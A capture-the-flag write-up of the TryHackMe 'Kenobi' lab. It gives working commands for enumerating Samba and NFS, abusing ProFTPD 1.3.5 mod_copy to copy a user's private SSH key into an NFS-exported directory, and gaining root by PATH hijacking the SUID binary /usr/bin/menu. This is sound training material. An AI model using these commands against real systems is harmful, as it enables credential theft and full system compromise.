# Resolution Report: Room “Kenobi” (TryHackMe)
**Author:** stylishack
**Date:** 14th January 2026
**Target IP:** 10.66.157.222
**Attacker IP:** 10.66.101.39

## Introduction
This report details the methodology followed to solve the TryHackMe room “Kenobi”. This Linux machine involved enumerating Samba for shares, exploiting a vulnerable version of ProFTPD (specifically the `mod_copy` module), and escalating privileges through PATH variable manipulation. The primary objective was to obtain both the user and root flags.

## Phase 1: Reconnaissance and Enumeration

The process commenced with a comprehensive network scan to identify open ports and services on the target machine.

### Nmap Scans

Initial Nmap scans were conducted to discover open ports and later to identify service versions and OS information.

-   **Full Port Scan:**
    -   **Command:** `nmap -p- --open -n -Pn -sS --min-rate 5000 10.66.157.222`
    -   **Results (Excerpt):**
        ```text
        PORT      STATE SERVICE
        21/tcp    open  ftp
        22/tcp    open  ssh
        80/tcp    open  http
        111/tcp   open  rpcbind
        139/tcp   open  netbios-ssn
        445/tcp   open  microsoft-ds
        2049/tcp  open  nfs
        39343/tcp open  unknown
        41585/tcp open  unknown
        48523/tcp open  unknown
        58531/tcp open  unknown
        ```

-   **Service and Version Detection Scan:**
    -   **Command:** `nmap -p 21,22,80,111,139,445,2049,39343,41585,48523,58531 -Pn -sC -sV -O -n 10.66.157.222`
    -   **Results (Excerpt):**
        ```text
        PORT      STATE SERVICE VERSION
        21/tcp    open  ftp     ProFTPD 1.3.5
        22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
        80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
        |_http-robots.txt: 1 disallowed entry
        |_/admin.html
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        |_http-title: Site doesn't have a title (text/html).
        111/tcp   open  rpcbind 2-4 (RPC #100000)
        | rpcinfo:
        | program version port/proto service
        | 100000  2,3,4 111/tcp rpcbind
        ...
        139/tcp   open  netbios-ssn Samba smbd 4.6.2
        445/tcp   open  netbios-ssn Samba smbd 4.6.2
        2049/tcp  open  nfs_acl 3 (RPC #100227)
        39343/tcp open  mountd  1-3 (RPC #100005)
        41585/tcp open  nlockmgr 1-4 (RPC #100021)
        48523/tcp open  mountd  1-3 (RPC #100005)
        58531/tcp open  mountd  1-3 (RPC #100005)
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
        ```
    -   **Key Findings:**
        *   **ProFTPD 1.3.5 (Port 21):** This version immediately stood out as a potential vulnerability point.
        *   **Samba smbd 4.6.2 (Ports 139, 445):** Indicated file sharing capabilities.
        *   **NFS (Ports 111, 2049, 39343, 48523, 58531):** Network File System services were active, suggesting shared directories.
        *   **Apache 2.4.41 (Port 80):** A web server was running, with a disallowed entry in `robots.txt` for `/admin.html`.
        *   **OpenSSH 8.2p1 (Port 22):** An SSH service was available.
        *   The OS was identified as Ubuntu Linux.

### ProFTPD Version Confirmation

The version of ProFTPD was quickly confirmed using `netcat` to connect to the FTP port and retrieve the banner.

-   **Command:** `nc 10.66.157.222 21`
-   **Output:** `220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.66.157.222]`
    -   **Confirmation:** The FTP server was indeed running ProFTPD version 1.3.5.

### ProFTPD Vulnerability Search

A local search for exploits related to ProFTPD 1.3.5 was performed using `searchsploit`.

-   **Command:** `searchsploit proftpd 1.3.5`
-   **Results:**
    ```text
    ---------------------------------------------- ---------------------------------
    Exploit Title                                | Path
    ---------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
    ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
    ---------------------------------------------- ---------------------------------
    ```
    -   **Key Finding:** Multiple exploits for the `mod_copy` module were found, specifically highlighting `CVE-2015-3306` (and related `CVE-2019-12815` as per NIST NVD), which allows remote attackers to read and write to arbitrary files via the `SITE CPFR` and `SITE CPTO` commands. This vulnerability proved critical for initial access.

### SMB Share Enumeration

Samba shares were enumerated to identify any publicly accessible directories that could provide additional information or vectors.

-   **Commands:**
    -   `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.66.157.222`
    -   `smbclient -L //10.66.157.222/ -N`
-   **Results (Excerpt from `smbclient`):**
    ```text
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    anonymous       Disk
    IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
    SMB1 disabled -- no workgroup available
    ```
    -   **Key Finding:** An `anonymous` share was discovered, suggesting potential unauthenticated access to shared files. This share was later confirmed to contain the `log.txt` file which revealed that the FTP service runs as the `kenobi` user and an SSH key is generated for this user.

### NFS Share Enumeration

NFS exports were investigated to understand potential mount points and their permissions.

-   **Command:** `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.66.157.222`
-   **Results (Excerpt):**
    ```text
    | nfs-ls: Volume /var
    | access: Read Lookup NoModify NoExtend NoDelete NoExecute
    ...
    | nfs-showmount:
    |_ /var *
    ```
    -   **Key Finding:** The `/var` directory was exported via NFS to `*` (everyone), meaning it could be mounted by any client. This was crucial for retrieving files moved using the ProFTPD vulnerability.

## Phase 2: Initial Access (User Flag)

With the `mod_copy` vulnerability identified in ProFTPD and the `/var` NFS export, a clear path to obtaining Kenobi's SSH private key emerged.

### Exploiting ProFTPD `mod_copy`

The `mod_copy` vulnerability allows an unauthenticated client to copy files on the server using `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) commands. We leveraged this to copy the `kenobi` user's private SSH key to a publicly accessible location.

-   **Commands (executed via `netcat`):**
    ```bash
    nc 10.66.157.222 21
    SITE CPFR /home/kenobi/.ssh/id_rsa
    # Server response: 350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    # Server response: 250 Copy successful
    quit
    ```
    -   **Logic:** The `id_rsa` file, belonging to the `kenobi` user, was copied from its secure location (`/home/kenobi/.ssh/`) to a temporary directory (`/var/tmp/`) which resides within the NFS-exported `/var` partition.

### Mounting the NFS Share and Retrieving the SSH Key

The `/var` NFS share was mounted on the attacker's machine to retrieve the `id_rsa` file.

-   **Commands:**
    ```bash
    mkdir -p /mnt/kenobiNFS
    mount 10.66.157.222:/var /mnt/kenobiNFS
    ls -la /mnt/kenobiNFS/tmp/
    ```
-   **Output:** The `id_rsa` file was visible in `/mnt/kenobiNFS/tmp/`.
    ```text
    -rw------- 1 0 0 1675 Aug  9  2025 id_rsa
    ```

The `id_rsa` file was then copied to the attacker's local directory and its permissions were corrected for SSH.

-   **Commands:**
    ```bash
    cp /mnt/kenobiNFS/tmp/id_rsa .
    chmod 600 id_rsa
    ```
    -   **Logic:** SSH requires private key files to have restrictive permissions (only readable by the owner) to prevent unauthorised access.

### SSH Login as Kenobi

With the private key secured, an SSH connection was established to the target machine as the `kenobi` user.

-   **Command:** `ssh -i id_rsa kenobi@10.66.157.222`
-   **Output:**
    ```text
    The authenticity of host '10.66.157.222 (10.66.157.222)' can't be established.
    ECDSA key fingerprint is SHA256:DGiqGU7vfYXltKiCXqO3xDvL7bDgMLUhJ5Lf5lWaGXk.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.66.157.222' (ECDSA) to the list of known hosts.
    Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
    ...
    Last login: Sat Aug 9 07:57:51 2025 from 10.23.8.228
    kenobi@kenobi:~$
    ```
    -   **Result:** Successfully logged in as `kenobi`.

### Obtaining the User Flag

The `user.txt` flag was located in the `kenobi` user's home directory.

-   **Commands:**
    ```bash
    ls
    cat user.txt
    ```
-   **User Flag:**

## Phase 3: Privilege Escalation (Root Flag)

Having gained a user shell, the next step was to enumerate the system for privilege escalation opportunities.

### Identifying SUID Binaries

SUID (Set User ID) binaries run with the permissions of their owner, often `root`. Searching for non-standard SUID files can reveal vulnerabilities.

-   **Command:** `find / -perm -u=s -type f 2>/dev/null`
-   **Results (Excerpt):**
    ```text
    /snap/core20/2599/usr/bin/chfn
    ...
    /usr/bin/chfn
    ...
    /usr/bin/menu
    ...
    /bin/umount
    ```
    -   **Key Finding:** The `/usr/bin/menu` binary appeared unusual as it is not a standard SUID binary in a typical Linux installation.

### Analysing `/usr/bin/menu`

Executing `/usr/bin/menu` revealed a simple command-line interface.

-   **Command:** `/usr/bin/menu`
-   **Output:**
    ```text
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :
    ```
    -   **Logic:** Upon selecting option 1 (`status check`), the program executed `curl -I localhost`. This indicated that `menu` was calling external programs without specifying their full path, creating a potential PATH hijacking vulnerability.

### Exploiting PATH Hijacking for Root Shell

The vulnerability lies in `/usr/bin/menu` calling `curl` without its full path. Since `/usr/bin/menu` is an SUID binary owned by `root`, any command it executes will also run with `root` privileges. By manipulating the `PATH` environment variable, we could trick `menu` into executing a malicious `curl` script instead of the legitimate `curl` binary.

-   **Actions:**
    1.  **Navigate to a writable directory:** `/tmp` is commonly used.
        ```bash
        cd /tmp
        ```
    2.  **Create a malicious `curl` executable:** This script simply executes a `/bin/sh` shell.
        ```bash
        echo /bin/sh > curl
        ```
    3.  **Grant executable permissions:**
        ```bash
        chmod 777 curl
        ```
    4.  **Modify the `PATH` environment variable:** Prepend `/tmp` to `PATH`, ensuring that the system looks for executables in `/tmp` before standard system directories.
        ```bash
        export PATH=/tmp:$PATH
        ```
    5.  **Execute the vulnerable binary:**
        ```bash
        /usr/bin/menu
        ```
    6.  **Select option 1:** This triggers the execution of our malicious `curl`.
        ```text
        ** Enter your choice :1
        ```
    7.  **Verify root access:**
        ```bash
        # whoami
        root
        ```
        -   **Result:** A root shell was successfully obtained.

### Obtaining the Root Flag

The root flag was located in the `/root` directory.

-   **Command:** `cat /root/root.txt`
-   **Root Flag:**

## Conclusion

Solving the “Kenobi” room involved a comprehensive approach, combining reconnaissance, vulnerability identification, and a multi-stage exploitation chain. The initial access was gained by exploiting the `ProFTPD 1.3.5 mod_copy` vulnerability, allowing the exfiltration of the `kenobi` user's SSH private key through a publicly accessible NFS share. This led to user-level access. Privilege escalation was achieved by identifying a non-standard SUID binary (`/usr/bin/menu`) that was susceptible to a PATH hijacking attack, ultimately granting a root shell.

The overall path taken was:
**Nmap Scan** (Service enumeration, OS detection) -> **ProFTPD Vulnerability Identification** (`mod_copy`) -> **SMB/NFS Share Enumeration** (Discover `anonymous` share and `/var` export) -> **ProFTPD `mod_copy` Exploitation** (Copy SSH key to `/var/tmp`) -> **NFS Mount** (Retrieve SSH key) -> **SSH Login** (as `kenobi`) -> **User Flag Retrieval** -> **SUID Binary Search** (Identify `/usr/bin/menu`) -> **PATH Hijacking Exploitation** (Gain root shell) -> **Root Flag Retrieval**.

This exercise provided valuable experience in chaining multiple vulnerabilities and understanding Linux privilege escalation techniques.

